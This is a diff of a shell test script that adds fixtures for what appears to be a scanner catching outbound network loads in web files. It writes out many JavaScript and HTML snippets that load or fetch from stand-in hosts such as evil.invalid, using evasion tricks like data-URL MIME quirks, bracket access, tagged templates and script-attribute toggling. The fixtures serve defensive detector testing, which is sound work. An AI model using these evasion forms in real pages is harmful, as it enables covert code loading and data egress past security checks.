@@ -102,7 +102,7 @@ printf 'download %s\n' "$(url_https evil.invalid/x)"                 > "$T/travt
 # --- 2.0.3-r5 fixtures (Codex round-4 exact-head), each class ISOLATED in its own dir ---
 # shellcheck disable=SC1003  # not an escaped quote: exactly two literal backslash characters
 _bs='\\'
-mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/worker" "$T/swreg" \
+mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/taggedfetch" "$T/brackettaggedfetch" "$T/worker" "$T/swreg" \
          "$T/locnav" "$T/bslash" "$T/jsprop" "$T/fpsrc" "$T/fpdata" "$T/fpdiv"
 # finding 1: text-classified file (first 8K printable) with a LATE NUL + real URL — the NUL must not
 # be able to collapse the counts channel into a false PASS (counts ride a separate trusted file)
@@ -114,6 +114,11 @@ printf 'import x from "%sevil.invalid/mod.js";\n' "$_pr"             > "$T/esmod
 printf 'export { a } from "%sevil.invalid/re.js";\n' "$_pr"          > "$T/expfrom/a.js"     # export-from
 # shellcheck disable=SC2016  # the backticks are JS template-literal SYNTAX and must stay literal
 printf 'fetch(`%sevil.invalid/bt`);\n' "$_pr"                        > "$T/btfetch/a.js"     # backtick template
+# A static tagged template still invokes fetch; its one-element array coerces to the URL string.
+# shellcheck disable=SC2016  # the backticks are JS tagged-template syntax and must stay literal
+printf 'fetch`%sevil.invalid/tagged`\n' "$_pr"                       > "$T/taggedfetch/a.js"
+# shellcheck disable=SC2016  # the backticks are JS tagged-template syntax and must stay literal
+printf 'globalThis["fetch"]`%sevil.invalid/bracket-tagged`\n' "$_pr" > "$T/brackettaggedfetch/a.js"
 printf 'new Worker("%sevil.invalid/w.js");\n' "$_pr"                 > "$T/worker/a.js"      # dedicated worker
 printf 'navigator.serviceWorker.register("%sevil.invalid/sw.js");\n' "$_pr" > "$T/swreg/a.js"
 printf 'location.assign("%sevil.invalid/nav");\n' "$_pr"             > "$T/locnav/a.js"
@@ -446,7 +451,154 @@ mkdir -p "$T/r8htmlrawtab" "$T/r8htmlentitytab" "$T/r8metatab" \
          "$T/r8javascriptsettitlecontrol" "$T/r8optionallocationassign" \
          "$T/r8optionallocationbracket" "$T/r8optionalwindowassign" \
          "$T/r8optionalwindowbracket" "$T/r8optionalglobalbracket" \
-         "$T/r8optionalpropertycontrol" "$T/r8optionalkeycontrol"
+         "$T/r8optionalpropertycontrol" "$T/r8optionalkeycontrol" \
+         "$T/r9classicdataomitted" "$T/r9classicdataplain" \
+         "$T/r9classicdataarbitrarymime" "$T/r9classictypedata" \
+         "$T/r9classicemptytype" "$T/r9moduledataomitted" \
+         "$T/r9moduledataplain" "$T/r9moduledatajavascript" \
+         "$T/r9datablocksrccontrol" "$T/r9workeromitted" \
+         "$T/r9workerplain" "$T/r9sharedworkerplain" \
+         "$T/r9workermoduleplain" "$T/r9sharedworkermoduleplain" \
+         "$T/r9workermodulejavascript" "$T/r9sharedworkermodulejavascript" \
+         "$T/r9importscriptsomitted" "$T/r9importscriptsplain" \
+         "$T/r9importscriptsjavascript" "$T/r9dynamicimportomitted" \
+         "$T/r9dynamicimportplain" "$T/r9bracketworkerplain" \
+         "$T/r9bracketsharedmoduleplain" "$T/r9dynamicscriptsrc" \
+         "$T/r9dynamicscriptsetter" "$T/r9dynamicscriptmoduleplain" \
+         "$T/r9dynamicscriptmodulejavascript" "$T/r9dynamicsettermoduleplain" \
+         "$T/r9dynamicscriptdatablock" "$T/r9dynamicimagesrccontrol" \
+         "$T/r9immediatescriptsrc" "$T/r9valuelesstypeduplicate" \
+         "$T/r9valuelesslanguageduplicate" "$T/r9scriptremovetype" \
+         "$T/r9scriptbrackettype" "$T/r9scriptsetattributensmodule" \
+         "$T/r9scriptremoveattributens" "$T/r9scripttoggletype" \
+         "$T/r9classictypeparams" "$T/r9importscriptssecond" \
+         "$T/r9bracketimportscriptssecond" "$T/r9bracketscriptsrc" \
+         "$T/r9bracketscriptsetter" "$T/r9inlinejsoncontrol" \
+         "$T/r9workermoduletrailing" "$T/r9workermodulequoted" \
+         "$T/r9workermodulebeforeother" "$T/r9immediatebracketsrc" \
+         "$T/r9immediatebracketsetter" "$T/r9workermoduleescaped"
+mkdir -p "$T/r9optionalbracketimportscripts" "$T/r9bracketremovetype" \
+         "$T/r9bracketremoveattributens" "$T/r9brackettoggletype" \
+         "$T/r9bracketsettypemodule" "$T/r9bracketsetnstypemodule" \
+         "$T/r9workergetterclassic" "$T/r9workersetterclassic" \
+         "$T/r9shadowimgscript" "$T/r9shadowscriptimg" \
+         "$T/r9shadowscriptscript"
+mkdir -p "$T/r9thisimportscripts" "$T/r9optionalthisimportscripts" \
+         "$T/r9sharedworkergetterclassic" "$T/r9bracketsetnsnonnull" \
+         "$T/r9dotsetnsnonnull" "$T/r9bracketremovensnonnull" \
+         "$T/r9dotremovensnonnull" "$T/r9setnsemptymodule"
+mkdir -p "$T/r9importmapremote" "$T/r9importmapdata" \
+         "$T/r9speculationrulesremote" "$T/r9conditionalmodule" \
+         "$T/r9functionmodule" "$T/r9conditionaldatablock" \
+         "$T/r9externalscriptbodycontrol"
+mkdir -p "$T/r9nestedcalledremove" "$T/r9parenthisimport" \
+         "$T/r9parentmemberimport" "$T/r9parentfetch" \
+         "$T/r9parentworker" "$T/r9parentglobalworker" \
+         "$T/r9parentscriptsrc" "$T/r9appendchildscriptsrc" \
+         "$T/r9parentremoval" "$T/r9optionalreceiverremove" \
+         "$T/r9optionalcallremove" "$T/r9namespaceuppercase" \
+         "$T/r9namespaceremoveuppercase" "$T/r9uppercaseproperty" \
+         "$T/r9uppercasebracketproperty" "$T/r9uppercasesettermethod" \
+         "$T/r9uppercasebracketsetter" "$T/r9uppercaseremovercontrol"
+mkdir -p "$T/r9nestedparenfetch" "$T/r9parenlocationassign" \
+         "$T/r9parenwindowopen" "$T/r9parenserviceregister" \
+         "$T/r9parenxhropen" "$T/r9parenlocationbracket" \
+         "$T/r9parenglobaldotlocation" "$T/r9parenappendchildsrc"
+mkdir -p "$T/r9workeruppercasekey" "$T/r9workeruppercasevalue" \
+         "$T/r9workerpaddedvalue"
+mkdir -p "$T/r9groupedfetcharg" "$T/r9groupedimportkey" \
+         "$T/r9groupedlocationkey" "$T/r9groupedscriptsrckey" \
+         "$T/r9groupedsrcvalue" "$T/r9groupedsetterargs" \
+         "$T/r9groupedstringcontrol" "$T/r9groupedworkermodule" \
+         "$T/r9groupedtypemodule" "$T/r9groupedsettypemodule"
+mkdir -p "$T/r9cssimporturldata" "$T/r9cssimporturlunquoted" \
+         "$T/r9cssbackgrounddatacontrol" "$T/r9linkstylesheetdata" \
+         "$T/r9linkalternatestylesheetdata" "$T/r9linkicondata" \
+         "$T/r9linkpreloaddata" "$T/r9linkiconremote"
+mkdir -p "$T/r9xlinkdot" "$T/r9xlinkbracket" "$T/r9xlinkothernscontrol" \
+         "$T/r9dynamicimghtmlcontrol" "$T/r9dynamicimgbracketcontrol" \
+         "$T/r9dynamicimgsettercontrol" "$T/r9dynamicimgremote" \
+         "$T/r9unknownsrchtml" "$T/r9dynamiciframehtml"
+mkdir -p "$T/r9workeroptionsgrouped" "$T/r9workeroptionscomma" \
+         "$T/r9asimodule" "$T/r9asiconditional" \
+         "$T/r9importmapkeycontrol" "$T/r9importmapscopekeycontrol"
+mkdir -p "$T/r9cssescapedurl" "$T/r9cssescapedimport" \
+         "$T/r9cssescapeddatascheme" "$T/r9cssescapedstringcontrol" \
+         "$T/r9relvtcontrol" "$T/r9relnbspcontrol" \
+         "$T/r9relemspcontrol" "$T/r9reltabstylesheet"
+mkdir -p "$T/r9directtypeexpression" "$T/r9brackettypeexpression" \
+         "$T/r9newlinetypeexpression" "$T/r9asicrmodule" \
+         "$T/r9asicrconditional" "$T/r9imageshadow" \
+         "$T/r9imageparametershadow" "$T/r9unknownxlinknamespace"
+mkdir -p "$T/r9cssescapedlinecontinuation" "$T/r9directtypeconcat" \
+         "$T/r9imagearrowshadow" "$T/r9unknownxlinkbracket"
+mkdir -p "$T/r9cssunquotedescapeddata" "$T/r9cssunquotedescapedremote" \
+         "$T/r9cssinvalidescapedimportcontrol" "$T/r9cssinvalidescapedurlcontrol" \
+         "$T/r9cssbadstringrecovery"
+mkdir -p "$T/r9imageinitializerand" "$T/r9scriptinitializerand" \
+         "$T/r9iframeinitializerscript" "$T/r9imagearraydestructure" \
+         "$T/r9imageobjectdestructure" "$T/r9imagenesteddefaultshadow"
+mkdir -p "$T/r9dynamicdirecttype" "$T/r9dynamicbrackettype" \
+         "$T/r9dynamicsettype" "$T/r9dynamicsettypename" \
+         "$T/r9dynamiccreateelement"
+mkdir -p "$T/r9cssinvalidunquotedcontinuation" "$T/r9cssbadstringff" \
+         "$T/r9scriptaliasshadow" "$T/r9letiframeintoscript" \
+         "$T/r9iframealiasscript" "$T/r9iframearrowaliasscript" \
+         "$T/r9scriptaliasiframe" "$T/r9scriptarrowaliasiframe" \
+         "$T/r9scriptinterveningstatement"
+mkdir -p "$T/r9preservesettersideeffect" "$T/r9preservenssideeffect" \
+         "$T/r9preserveremovesideeffect" "$T/r9preservetogglesideeffect" \
+         "$T/r9staticpreservecontrol"
+mkdir -p "$T/r9csscustomslashrecovery" "$T/r9csscustomhtmlrecovery" \
+         "$T/r9csscustombacktickrecovery" "$T/r9cssescapedspaceimportcontrol" \
+         "$T/r9cssescapedspacekeywordcontrol"
+mkdir -p "$T/r9cssescapedspacenamecontrol" "$T/r9cssescapedspacemidnamecontrol" \
+         "$T/r9cssescapednbspnamecontrol" "$T/r9csshyphenurlcontrol" \
+         "$T/r9csshyphenimagecontrol" "$T/r9csshyphenimagesetcontrol"
+mkdir -p "$T/r9regexabstractclass" "$T/r9regexdeclareclass" \
+         "$T/r9regexconstenum" "$T/r9regextypealias" "$T/r9regexdecoratedclass"
+mkdir -p "$T/r9shadoweddocumentscript" "$T/r9suffixdocumentscript" \
+         "$T/r9shadoweddocumentimage" "$T/r9parameterdocument" \
+         "$T/r9destructureddocument"
+mkdir -p "$T/r9regexinterfacegeneric" "$T/r9regexinterfaceextends" \
+         "$T/r9regextypeintersection" "$T/r9regextypegenericdefault" \
+         "$T/r9regexdeclaremodule" "$T/r9regexdecoratorobject"
+mkdir -p "$T/r9loopdocument" "$T/r9methoddocument" \
+         "$T/r9destructuredparamdocument" "$T/r9defaultdestructureddocument" \
+         "$T/r9generatordocument"
+mkdir -p "$T/r9cssdotlessimportcontrol" "$T/r9cssdottedimportcontrol" \
+         "$T/r9cssdotlessimagecontrol" "$T/r9csslongsschemecontrol" \
+         "$T/r9csslongsstuncontrol" "$T/r9cssupperhttps"
+mkdir -p "$T/r9cjsmoduledivision" "$T/r9cjsglobaldivision" \
+         "$T/r9cjsnamespacedivision"
+mkdir -p "$T/r9bareevaldocument" "$T/r9groupedevaldocument" \
+         "$T/r9nestedgroupedevaldocument" "$T/r9withdocument"
+mkdir -p "$T/r9regexclassgeneric" "$T/r9regexclassimplements" \
+         "$T/r9regexdefaultinterface" "$T/r9regexinterfaceconstraint" \
+         "$T/r9regextypetuple" "$T/r9regextypeunion" \
+         "$T/r9regexdeclareconst"
+mkdir -p "$T/r9regextypetrailingdivision" \
+         "$T/r9regexdeclaretrailingdivision" "$T/r9regexmultitypecontrol" \
+         "$T/r9regexmultilinetypecontrol" "$T/r9regextypenewlinetail" \
+         "$T/r9regexdeclarenewlinetail" "$T/r9regexmultilineuncertcontrol" \
+         "$T/r9regexterminatedmultilinetypecontrol" \
+         "$T/r9regexterminatedambientcontrol" "$T/r9regexterminatedtypefetch"
+mkdir -p "$T/r9crossscriptdocument" "$T/r9crossfiledocument" \
+         "$T/r9multiscriptglobalcontrol"
+mkdir -p "$T/r9crlinecomment" "$T/r9crhtmlcomment" \
+         "$T/r9crimportregex" "$T/r9crexportregex" \
+         "$T/r9crwaiverlaunder" "$T/r9crsamewaiver"
+mkdir -p "$T/r9lslinecomment" "$T/r9pslinecomment" "$T/r9lshtmlcomment" \
+         "$T/r9lsimportregex" "$T/r9psexportregex" "$T/r9lswaiverlaunder" \
+         "$T/r9pssamewaiver" "$T/r9lscontinuation" "$T/r9pscontinuation" \
+         "$T/r9lsasimodule" "$T/r9psasiconditional" "$T/r9lsblockcommentasi"
+mkdir -p "$T/r9entitylscomment" "$T/r9entitypscomment" \
+         "$T/r9entitynbspfetch" "$T/r9entitybomfetch" "$T/r9srcdocentityls"
+mkdir -p "$T/r9entitylswaiverborrow" "$T/r9srcdocpswaiverborrow" \
+         "$T/r9cssentitycrwaiverborrow" "$T/r9cssentitylfwaiverborrow" \
+         "$T/r9cssentityffwaiverborrow" "$T/r9entitylswaivercontrol" \
+         "$T/r9cssentitycrwaivercontrol" "$T/r9cssrawffwaiverborrow" \
+         "$T/r9cssrawffwaivercontrol"
 printf '<img src="h\tt%s%s%stab.invalid/raw">\n' "$_t" "$_x" "$J" \
   > "$T/r8htmlrawtab/i.html"
 printf '<img src="h&#x09;t%s%s%stab.invalid/entity">\n' "$_t" "$_x" "$J" \
@@ -536,6 +688,624 @@ printf '<link rel="modulepreload" href="data:text/javascript,void%%200#import(%%
   > "$T/r8modulefragmentcontrol/i.html"
 printf 'import("data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fencoded%%23hash%%3Fquery%%22)")\n' \
   > "$T/r8encodedurlmetadata/a.js"
+
+# Classic external scripts intentionally ignore the response MIME essence. A data URL with an
+# omitted media type defaults to text/plain, but its bytes still execute as classic JavaScript;
+# arbitrary declared response types do too. Module scripts retain strict JavaScript MIME checking,
+# and a non-JavaScript script-element `type` is an inert data block rather than a classic script.
+printf '<script src="data:,fetch(%%22https%%3A%%2F%%2Fevil.invalid%%2Fclassic-omitted%%22)"></script>\n' \
+  > "$T/r9classicdataomitted/i.html"
+printf '<script src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fclassic-plain%%22)"></script>\n' \
+  > "$T/r9classicdataplain/i.html"
+printf '<script src="data:image/svg+xml,fetch(%%22%%2F%%2Fevil.invalid%%2Fclassic-arbitrary%%22)"></script>\n' \
+  > "$T/r9classicdataarbitrarymime/i.html"
+printf '<script type="text/javascript" src="data:application/json,fetch(%%22%%2F%%2Fevil.invalid%%2Fclassic-type%%22)"></script>\n' \
+  > "$T/r9classictypedata/i.html"
+printf '<script type="" src="data:text/csv,fetch(%%22%%2F%%2Fevil.invalid%%2Fclassic-empty%%22)"></script>\n' \
+  > "$T/r9classicemptytype/i.html"
+printf '<script type="module" src="data:,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-omitted%%22)"></script>\n' \
+  > "$T/r9moduledataomitted/i.html"
+printf '<script type="module" src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-plain%%22)"></script>\n' \
+  > "$T/r9moduledataplain/i.html"
+printf '<script type="module" src="data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fmodule-js%%22)"></script>\n' \
+  > "$T/r9moduledatajavascript/i.html"
+printf '<script type="application/json" src="data:text/javascript,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdata-block%%22)"></script>\n' \
+  > "$T/r9datablocksrccontrol/i.html"
+printf 'new Worker("data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-omitted%%22)")\n' \
+  > "$T/r9workeromitted/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-plain%%22)")\n' \
+  > "$T/r9workerplain/a.js"
+printf 'new SharedWorker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fshared-plain%%22)")\n' \
+  > "$T/r9sharedworkerplain/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fworker-module-plain%%22)",{type:"module"})\n' \
+  > "$T/r9workermoduleplain/a.js"
+printf 'new SharedWorker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fshared-module-plain%%22)",{name:"local",type:"module"})\n' \
+  > "$T/r9sharedworkermoduleplain/a.js"
+printf 'new Worker("data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-module-js%%22)",{type:"module"})\n' \
+  > "$T/r9workermodulejavascript/a.js"
+printf 'new SharedWorker("data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fshared-module-js%%22)",{name:"local",type:"module"})\n' \
+  > "$T/r9sharedworkermodulejavascript/a.js"
+printf 'importScripts("data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fimportscripts-omitted%%22)")\n' \
+  > "$T/r9importscriptsomitted/a.js"
+printf 'importScripts("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fimportscripts-plain%%22)")\n' \
+  > "$T/r9importscriptsplain/a.js"
+printf 'importScripts("data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fimportscripts-js%%22)")\n' \
+  > "$T/r9importscriptsjavascript/a.js"
+printf 'import("data:,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-omitted%%22)")\n' \
+  > "$T/r9dynamicimportomitted/a.js"
+printf 'import("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-plain%%22)")\n' \
+  > "$T/r9dynamicimportplain/a.js"
+printf 'new globalThis["Worker"]("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-worker%%22)")\n' \
+  > "$T/r9bracketworkerplain/a.js"
+printf 'new globalThis["SharedWorker"]("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fbracket-shared-module%%22)",{type:"module"})\n' \
+  > "$T/r9bracketsharedmoduleplain/a.js"
+printf 'const s=document.createElement("script");s.src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-src%%22)"\n' \
+  > "$T/r9dynamicscriptsrc/a.js"
+printf 'const s=document.createElement("script");s.setAttribute("src","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-setter%%22)")\n' \
+  > "$T/r9dynamicscriptsetter/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-module-plain%%22)"\n' \
+  > "$T/r9dynamicscriptmoduleplain/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.src="data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-module-js%%22)"\n' \
+  > "$T/r9dynamicscriptmodulejavascript/a.js"
+printf 'const s=document.createElement("script");s.setAttribute("type","module");s.setAttribute("src","data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-set-module%%22)")\n' \
+  > "$T/r9dynamicsettermoduleplain/a.js"
+printf 'const s=document.createElement("script");s.type="application/json";s.src="data:text/javascript,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-data-block%%22)"\n' \
+  > "$T/r9dynamicscriptdatablock/a.js"
+printf 'const i=document.createElement("img");i.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdynamic-image%%22)"\n' \
+  > "$T/r9dynamicimagesrccontrol/a.js"
+printf 'document.createElement("script").src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fimmediate-script%%22)"\n' \
+  > "$T/r9immediatescriptsrc/a.js"
+printf '<script type src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fvalueless-type%%22)" type="module"></script>\n' \
+  > "$T/r9valuelesstypeduplicate/i.html"
+printf '<script language src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fvalueless-language%%22)" language="module"></script>\n' \
+  > "$T/r9valuelesslanguageduplicate/i.html"
+printf 'const s=document.createElement("script");s.type="module";s.removeAttribute("type");s.src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fremove-type%%22)"\n' \
+  > "$T/r9scriptremovetype/a.js"
+printf 'const s=document.createElement("script");s.type="module";s["type"]="";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-type%%22)"\n' \
+  > "$T/r9scriptbrackettype/a.js"
+printf 'const s=document.createElement("script");s.setAttributeNS(null,"type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fset-ns-module%%22)"\n' \
+  > "$T/r9scriptsetattributensmodule/a.js"
+printf 'const s=document.createElement("script");s.type="application/json";s.removeAttributeNS(null,"type");s.src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Fremove-ns%%22)"\n' \
+  > "$T/r9scriptremoveattributens/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.toggleAttribute("type");s.src="data:,fetch(%%22%%2F%%2Fevil.invalid%%2Ftoggle-type%%22)"\n' \
+  > "$T/r9scripttoggletype/a.js"
+printf '<script type="text/javascript; charset=utf-8" src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Ftype-params%%22)"></script>\n' \
+  > "$T/r9classictypeparams/i.html"
+printf 'importScripts("data:,void(0)","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fsecond-import%%22)")\n' \
+  > "$T/r9importscriptssecond/a.js"
+printf 'self["importScripts"]("data:,void(0)","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fsecond-bracket-import%%22)")\n' \
+  > "$T/r9bracketimportscriptssecond/a.js"
+printf 'const s=document.createElement("script");s["src"]="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-src%%22)";document.head.append(s)\n' \
+  > "$T/r9bracketscriptsrc/a.js"
+printf 'const s=document.createElement("script");s["setAttribute"]("src","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-setter%%22)");document.head.append(s)\n' \
+  > "$T/r9bracketscriptsetter/a.js"
+printf '<script type="application/json">fetch("//docs.invalid/inert-inline-data")</script>\n' \
+  > "$T/r9inlinejsoncontrol/i.html"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-trailing%%22)",{type:"module",})\n' \
+  > "$T/r9workermoduletrailing/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-quoted%%22)",{"type":"module"})\n' \
+  > "$T/r9workermodulequoted/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-before-other%%22)",{type:"module",name:"safe"})\n' \
+  > "$T/r9workermodulebeforeother/a.js"
+printf 'document.createElement("script")["src"]="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fimmediate-bracket-src%%22)"\n' \
+  > "$T/r9immediatebracketsrc/a.js"
+printf 'document.createElement("script")["setAttribute"]("src","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fimmediate-bracket-setter%%22)")\n' \
+  > "$T/r9immediatebracketsetter/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmodule-escaped%%22)",{t\\u0079pe:"module"})\n' \
+  > "$T/r9workermoduleescaped/a.js"
+printf 'self?.["importScripts"]("data:,0","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Foptional-import%%22)")\n' \
+  > "$T/r9optionalbracketimportscripts/a.js"
+printf 'const s=document.createElement("script");s.type="module";s["removeAttribute"]("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-remove%%22)"\n' \
+  > "$T/r9bracketremovetype/a.js"
+printf 'const s=document.createElement("script");s.type="module";s["removeAttributeNS"](null,"type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-remove-ns%%22)"\n' \
+  > "$T/r9bracketremoveattributens/a.js"
+printf 'const s=document.createElement("script");s.type="module";s["toggleAttribute"]("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-toggle%%22)"\n' \
+  > "$T/r9brackettoggletype/a.js"
+printf 'const s=document.createElement("script");s["setAttribute"]("type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fbracket-set-module%%22)"\n' \
+  > "$T/r9bracketsettypemodule/a.js"
+printf 'const s=document.createElement("script");s["setAttributeNS"](null,"type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fbracket-set-ns-module%%22)"\n' \
+  > "$T/r9bracketsetnstypemodule/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fgetter-classic%%22)",{type:"module",get type(){return "classic"}})\n' \
+  > "$T/r9workergetterclassic/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fsetter-classic%%22)",{type:"module",set type(value){}})\n' \
+  > "$T/r9workersetterclassic/a.js"
+printf 'const s=document.createElement("img");{const s=document.createElement("script");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fshadow-inner-script%%22)";document.head.append(s)}\n' \
+  > "$T/r9shadowimgscript/a.js"
+printf 'const s=document.createElement("script");{const s=document.createElement("img");s.src="data:,0"}s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fshadow-outer-script%%22)"\n' \
+  > "$T/r9shadowscriptimg/a.js"
+printf 'const s=document.createElement("script");{const s=document.createElement("script");s.type="module"}s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fshadow-script-state%%22)"\n' \
+  > "$T/r9shadowscriptscript/a.js"
+printf 'this["importScripts"]("data:,0","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fthis-import%%22)")\n' \
+  > "$T/r9thisimportscripts/a.js"
+printf 'this?.["importScripts"]("data:,0","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Foptional-this-import%%22)")\n' \
+  > "$T/r9optionalthisimportscripts/a.js"
+printf 'new SharedWorker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fshared-getter-classic%%22)",{type:"module",get type(){return "classic"}})\n' \
+  > "$T/r9sharedworkergetterclassic/a.js"
+printf 'const s=document.createElement("script");s["setAttributeNS"]("urn:test","type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-ns-set%%22)"\n' \
+  > "$T/r9bracketsetnsnonnull/a.js"
+printf 'const s=document.createElement("script");s.setAttributeNS("urn:test","type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdot-ns-set%%22)"\n' \
+  > "$T/r9dotsetnsnonnull/a.js"
+printf 'const s=document.createElement("script");s.type="module";s["removeAttributeNS"]("urn:test","type");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fbracket-ns-remove%%22)"\n' \
+  > "$T/r9bracketremovensnonnull/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.removeAttributeNS("urn:test","type");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fdot-ns-remove%%22)"\n' \
+  > "$T/r9dotremovensnonnull/a.js"
+printf 'const s=document.createElement("script");s.setAttributeNS("","type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fempty-ns-set%%22)"\n' \
+  > "$T/r9setnsemptymodule/a.js"
+printf '<script type="importmap">{"imports":{"remote":"//egress.invalid/import-map.js"}}</script><script type="module">import "remote"</script>\n' \
+  > "$T/r9importmapremote/i.html"
+printf '<script type="importmap">{"imports":{"remote":"data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fimport-map-data%%22)"}}</script><script type="module">import "remote"</script>\n' \
+  > "$T/r9importmapdata/i.html"
+printf '<script type="speculationrules">{"prefetch":[{"source":"list","urls":["//egress.invalid/speculation"]}]}</script>\n' \
+  > "$T/r9speculationrulesremote/i.html"
+printf 'const s=document.createElement("script");if(false)s.type="module";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fconditional-module%%22)"\n' \
+  > "$T/r9conditionalmodule/a.js"
+printf 'const s=document.createElement("script");function never(){s.type="module"}s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Ffunction-module%%22)"\n' \
+  > "$T/r9functionmodule/a.js"
+printf 'const s=document.createElement("script");if(false)s.type="application/json";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fconditional-data%%22)"\n' \
+  > "$T/r9conditionaldatablock/a.js"
+printf '<script src="/local.js">fetch("//docs.invalid/ignored-child-text")</script>\n' \
+  > "$T/r9externalscriptbodycontrol/i.html"
+printf 'const s=document.createElement("script");function restore(){s.removeAttribute("type")}s.type="module";restore();s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fnested-called%%22)"\n' \
+  > "$T/r9nestedcalledremove/a.js"
+printf '(this)?.["importScripts"]?.("data:,0","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-this%%22)")\n' \
+  > "$T/r9parenthisimport/a.js"
+printf '(this["importScripts"])("data:,0","data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-member%%22)")\n' \
+  > "$T/r9parentmemberimport/a.js"
+printf '(fetch)("%sevil.invalid/paren-fetch")\n' "$_pr" \
+  > "$T/r9parentfetch/a.js"
+printf 'new (Worker)("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-worker%%22)")\n' \
+  > "$T/r9parentworker/a.js"
+printf 'new (globalThis["Worker"])("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-global-worker%%22)")\n' \
+  > "$T/r9parentglobalworker/a.js"
+printf 'const s=document.createElement("script");(s)["src"]="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-script-src%%22)"\n' \
+  > "$T/r9parentscriptsrc/a.js"
